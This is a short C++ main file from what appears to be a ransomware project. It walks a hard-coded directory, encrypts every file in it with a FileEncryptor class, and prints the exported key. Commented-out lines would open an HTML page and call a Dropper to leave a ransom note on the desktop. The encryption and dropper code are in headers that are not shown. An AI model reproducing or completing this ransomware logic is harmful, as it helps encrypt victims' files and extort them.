#include <iostream>
#include <vector>
#include <string>

#include "file_encryptor.h"
#include "dropper.h"

using std::cout;
using std::endl;
using std::vector;
using std::string;

int main(int argc, char* args[]) {
  FileEncryptor encryptor;

  for (const auto& file : encryptor.ListDirectory("/home/aesophor/Temp")) {
    encryptor.Encrypt(file);
  }
  cout << encryptor.Export() << endl;

  //system("xdg-open ~/Code/fuxsocy/DailyAllowance/pages/index.html");
  //Dropper dropper("/home/aesophor/Desktop/");
  //dropper.DropNote();

  return EXIT_SUCCESS;
}
